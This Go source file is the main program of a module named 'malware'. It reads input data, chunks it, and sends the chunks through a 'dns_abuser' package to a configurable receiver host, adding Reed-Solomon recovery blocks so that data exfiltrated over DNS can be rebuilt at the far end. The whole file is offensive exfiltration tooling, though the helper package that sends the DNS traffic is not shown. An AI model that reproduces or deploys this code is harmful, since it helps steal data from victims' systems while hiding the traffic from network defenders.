package main

import (
	"fmt"
	"malware/internal/reader"
	"malware/pkg/dns_abuser"
	"math"
	"os"
)

func main() {
	//capture.Run()
	//time.Sleep(2 * time.Second)

	retry := 1
	estimatedSize := 100

	content, err := reader.ReadInput()
	if err != nil {
		fmt.Println(err)
		return
	}

	receiver := os.Getenv("RECEIVER_HOST")
	if receiver == "" {
		receiver = "127.0.0.1"
	}

	blockCount := uint32(math.Ceil(float64(len(content)) / float64(estimatedSize)))
	blockLength := int(math.Ceil(float64(len(content)) / float64(blockCount)))

	id, err := dns_abuser.SendInitialBlock(blockCount, receiver, retry)
	if err != nil {
		fmt.Println("unable to send initial block", err)
		return
	}

	num := 1
	for i := 0; i < len(content); i, num = i+blockLength, num+1 {
		d := make([]byte, blockLength)
		if i+blockLength > len(content) {
			copy(d[:len(content)-i], content[i:])
		} else {
			copy(d, content[i:i+blockLength])
		}

		go func(id, d []byte, blockLength, num, retry int, receiver string) {
			err := dns_abuser.SendData(id, d, blockLength, num, receiver, retry)
			if err != nil {
				fmt.Printf("unable to send data block %d: %v\n", num, err)
				return
			}
		}(id, d, blockLength, num, retry, receiver)
	}

	err = dns_abuser.SendReedSolomonBlocks(id, content, estimatedSize, receiver)
	if err != nil {
		fmt.Println("unable to send reed solomon blocks", err)
		return
	}
}
